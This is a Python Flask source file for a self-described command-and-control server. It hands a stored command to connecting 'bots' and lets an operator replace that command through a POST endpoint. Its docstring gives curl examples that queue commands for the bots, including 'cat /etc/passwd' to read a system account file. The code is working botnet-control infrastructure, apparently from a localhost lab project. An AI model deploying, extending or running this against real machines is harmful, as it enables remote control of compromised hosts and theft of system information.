#!/usr/bin/python3
from flask import Flask, send_file, request
import os
import logging


app=Flask(__name__)


#setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s-%(levelname)s-(message)s')
logger=logging.getLogger(__name__)

#file with our commands
COMMAND_FILE="commands/command.txt"

@app.route('/')
def serve_command():
	"""Serve the command to bots"""
	try:
		if not os.path.exists(COMMAND_FILE):
			return "Command not found", 404

		#log the request
		client_ip=request.remote_addr
		logger.info(f"Command served to {client_ip}")

		#send the command file
		return send_file(COMMAND_FILE, mimetype='text/plain')

	except Exception as e:
		logger.error(f"Error serving command: {e}")
		return "Server error", 500
"""
Post allows us to use curl to send commands:
	curl -X POST http://127.0.0.1:8000/update_command \
  -d "command=ls -la"

curl -X POST http://127.0.0.1:8000/update_command \
  -d "command=whoami && pwd"

curl -X POST http://127.0.0.1:8000/update_command \
  -d "command=cat /etc/passwd"

"""
@app.route('/update_command', methods=['POST'])
def update_command():
	"""Update the command"""
	try:
		new_command=request.form.get('command')
		if not new_command:
			return "No command provided", 400

		with open(COMMAND_FILE, 'w')as f:
			f.write(new_command)

		logger.info(f"Command updated to: {new_command}")
		return f"Command updated to: {new_command}"

	except Exception as e:
		logger.error(f"Error Updating command: {e}")
		return "Error updating command", 500

def setup():
	"""Create commands directory and default command file"""
	if not os.path.exists("commands"):
		os.makedirs("commands")
		logger.info("Created commands directory")

	if not os.path.exists(COMMAND_FILE):
		with open(COMMAND_FILE, 'w')as f:
			f.write("whoami")
		logger.info("Created Default command file")

if __name__=='__main__':
	setup()
	logger.info("Flask C2 server starting on http://127.0.0.1:8000")
	app.run(host='127.0.0.1', port=8000, debug=False)

